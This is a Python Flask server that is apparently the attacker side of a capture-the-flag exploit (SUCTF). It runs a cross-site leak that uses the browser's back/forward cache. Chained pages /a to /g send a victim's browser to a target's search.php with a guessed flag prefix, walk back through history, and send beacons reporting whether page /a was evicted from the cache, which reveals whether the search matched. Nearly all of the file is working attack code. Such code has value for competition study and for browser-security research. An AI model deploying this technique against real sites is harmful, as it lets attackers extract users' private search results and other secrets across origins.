from flask import Flask, jsonify, request
import os


def create_app(
    initial_check_str: str = "flag{",
    initial_app_origin: str = "http://127.0.0.1:80",
) -> Flask:
    app = Flask(__name__)
    app.config["JSON_AS_ASCII"] = False
    state = {
        "check_str": initial_check_str,
        "app_origin": initial_app_origin,
        "last_signal": "",
        "last_result": "unknown",
    }

    def render_step_page(step: str, next_path: str | None) -> str:
        next_js = ""
        if next_path is not None:
            next_js = f"""
window.addEventListener('load', () => {{
  if (sessionStorage.getItem('chain_phase') !== 'phase1') {{
    return;
  }}
  setTimeout(() => {{
    window.location.href = '{next_path}';
  }}, 120);
}});
"""

        return f"""<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <title>step-{step}</title>
</head>
<body>
<script>
(() => {{
  function report(name) {{
    try {{
      navigator.sendBeacon('/log?log=' + encodeURIComponent(name));
    }} catch (e) {{
      fetch('/log?log=' + encodeURIComponent(name), {{ method: 'POST', keepalive: true }}).catch(() => {{}});
    }}
  }}

  window.addEventListener('pagehide', (e) => {{
    report('{step}_' + (e.persisted ? 'into' : 'no_into'));
  }});

  window.addEventListener('pageshow', (e) => {{
    if (sessionStorage.getItem('chain_phase') !== 'phase3') {{
      return;
    }}

    const markKey = 'phase3_checked_{step}';
    if (sessionStorage.getItem(markKey) !== '1') {{
      report('{step}_' + (e.persisted ? 'from_bfcache' : 'no_from_bfcache'));
      sessionStorage.setItem(markKey, '1');
    }}

    if ('{step}' === 'a') {{
      sessionStorage.removeItem('chain_phase');
      sessionStorage.removeItem('f_pageshow_count');
      sessionStorage.removeItem('attack_query');
      sessionStorage.removeItem('phase2_seen_f');
      sessionStorage.removeItem('phase3_checked_a');
      sessionStorage.removeItem('phase3_checked_b');
      sessionStorage.removeItem('phase3_checked_c');
      sessionStorage.removeItem('phase3_checked_d');
      sessionStorage.removeItem('phase3_checked_e');
      sessionStorage.removeItem('phase3_checked_f');
      report('chain_reset_at_a');
      return;
    }}

    setTimeout(() => {{
      window.history.back();
    }}, 120);
  }});

  {next_js}
}})();
</script>
<p>step: {step}</p>
</body>
</html>
"""

    @app.route("/log", methods=["GET", "POST"])
    def log_page():
        log = request.args.get("log", "")
        if not log:
            log = request.form.get("log", "")
        if log:
            if log == "a_no_from_bfcache":
                state["last_signal"] = log
                state["last_result"] = "hit"
            elif log == "a_from_bfcache":
                state["last_signal"] = log
                state["last_result"] = "miss"

            if log == "a_no_from_bfcache":
                print(f"\033[31m[LOG] {log} <-- SIGNAL\033[0m", flush=True)
            else:
                print(f"[LOG] {log}", flush=True)
        return ("ok", 200)

    @app.route("/check", methods=["GET", "POST"])
    def check_state():
        if request.method == "POST":
            value = request.form.get("value", "")
            app_origin = request.form.get("app_origin", "")
        else:
            value = request.args.get("value", "")
            app_origin = request.args.get("app_origin", "")

        if value is not None and value != "":
            state["check_str"] = value
            state["last_signal"] = ""
            state["last_result"] = "unknown"
            print(f"[CHECK] check_str updated => {state['check_str']}", flush=True)

        if app_origin is not None and app_origin != "":
            lowered = app_origin.lower()
            if lowered.startswith("http://") or lowered.startswith("https://"):
                state["app_origin"] = app_origin.rstrip("/")
                state["last_signal"] = ""
                state["last_result"] = "unknown"
                print(f"[CHECK] app_origin updated => {state['app_origin']}", flush=True)

        return jsonify({
            "check_str": state["check_str"],
            "app_origin": state["app_origin"],
            "last_signal": state["last_signal"],
            "last_result": state["last_result"],
        })

    @app.get("/a")
    def page_a():
        query = request.args.get("q", state["check_str"])
        app_origin = request.args.get("app", state["app_origin"])
        if not isinstance(app_origin, str):
            app_origin = state["app_origin"]
        lowered = app_origin.lower()
        if not (lowered.startswith("http://") or lowered.startswith("https://")):
            app_origin = state["app_origin"]
        app_origin = app_origin.rstrip("/")

        query_js = query.replace("\\", "\\\\").replace("'", "\\'")
        app_origin_js = app_origin.replace("\\", "\\\\").replace("'", "\\'")
        base = render_step_page("a", "/b")
        inject = f"""
<script>
(() => {{
  if (!sessionStorage.getItem('chain_phase')) {{
    sessionStorage.setItem('chain_phase', 'phase1');
  }}
  if (!sessionStorage.getItem('attack_query')) {{
    sessionStorage.setItem('attack_query', '{query_js}');
  }}
  if (!sessionStorage.getItem('attack_app_origin')) {{
    sessionStorage.setItem('attack_app_origin', '{app_origin_js}');
  }}
}})();
</script>
"""
        return base.replace("</body>", inject + "\n</body>")

    @app.get("/b")
    def page_b():
        return render_step_page("b", "/c")

    @app.get("/c")
    def page_c():
        return render_step_page("c", "/d")

    @app.get("/d")
    def page_d():
        return render_step_page("d", "/e")

    @app.get("/e")
    def page_e():
        return render_step_page("e", "/f")

    @app.get("/f")
    def page_f():
        return """<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <title>step-f</title>
</head>
<body>
<script>
(() => {
  function report(name) {
    try {
      navigator.sendBeacon('/log?log=' + encodeURIComponent(name));
    } catch (e) {
      fetch('/log?log=' + encodeURIComponent(name), { method: 'POST', keepalive: true }).catch(() => {});
    }
  }

  window.addEventListener('pagehide', (e) => {
    report('f_' + (e.persisted ? 'into' : 'no_into'));
  });

  window.addEventListener('pageshow', (e) => {
    const count = Number(sessionStorage.getItem('f_pageshow_count') || '0') + 1;
    sessionStorage.setItem('f_pageshow_count', String(count));

    // phase1: first time at /f, jump to search target.
    if (count === 1 && sessionStorage.getItem('chain_phase') === 'phase1') {
      const q = sessionStorage.getItem('attack_query') || 'flag';
      let appOrigin = sessionStorage.getItem('attack_app_origin') || 'http://127.0.0.1:80';
      while (appOrigin.endsWith('/')) {
        appOrigin = appOrigin.slice(0, -1);
      }
      setTimeout(() => {
        window.location.href = appOrigin + '/search.php?q=' + encodeURIComponent(q);
      }, 120);
      return;
    }

    // Returned from search.php
    if (count === 2 && sessionStorage.getItem('chain_phase') === 'phase1') {
      report('f_' + (e.persisted ? 'from_bfcache' : 'no_from_bfcache'));
      sessionStorage.setItem('chain_phase', 'phase2');
      setTimeout(() => {
        window.location.href = '/g';
      }, 120);
      return;
    }

    // Returned from /g, now start full backward probe to /a.
    if (sessionStorage.getItem('chain_phase') === 'phase2') {
      if (sessionStorage.getItem('phase2_seen_f') !== '1') {
        report('f_after_g_' + (e.persisted ? 'from_bfcache' : 'no_from_bfcache'));
        sessionStorage.setItem('phase2_seen_f', '1');
      }
      sessionStorage.setItem('chain_phase', 'phase3');
      setTimeout(() => {
        window.history.back();
      }, 120);
      return;
    }

    if (sessionStorage.getItem('chain_phase') === 'phase3') {
      const markKey = 'phase3_checked_f';
      if (sessionStorage.getItem(markKey) !== '1') {
        report('f_' + (e.persisted ? 'from_bfcache' : 'no_from_bfcache'));
        sessionStorage.setItem(markKey, '1');
      }
      setTimeout(() => {
        window.history.back();
      }, 120);
    }
  });
})();
</script>
<p>step: f</p>
</body>
</html>
"""

    @app.get("/g")
    def page_g():
        return """<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <title>step-g</title>
</head>
<body>
<script>
(() => {
  function report(name) {
    try {
      navigator.sendBeacon('/log?log=' + encodeURIComponent(name));
    } catch (e) {
      fetch('/log?log=' + encodeURIComponent(name), { method: 'POST', keepalive: true }).catch(() => {});
    }
  }

  window.addEventListener('pageshow', (e) => {
    report('g_' + (e.persisted ? 'from_bfcache' : 'no_from_bfcache'));
    if (sessionStorage.getItem('chain_phase') === 'phase2') {
      setTimeout(() => {
        window.history.back();
      }, 120);
    }
  });

  window.addEventListener('pagehide', (e) => {
    report('g_' + (e.persisted ? 'into' : 'no_into'));
  });
})();
</script>
<p>step: g</p>
</body>
</html>
"""

    return app


if __name__ == "__main__":
    check_str = "SUCTF{"
    app_origin = "http://127.0.0.1:80"
    app = create_app(check_str, app_origin)
    host = os.getenv("FLASK_HOST", "0.0.0.0")
    port = int(os.getenv("FLASK_PORT", "5036"))
    debug = os.getenv("FLASK_DEBUG", "0") == "1"
    print(f"[CHECK] init check_str => {check_str}", flush=True)
    print(f"[CHECK] init app_origin => {app_origin}", flush=True)
    app.run(host=host, port=port, debug=debug)
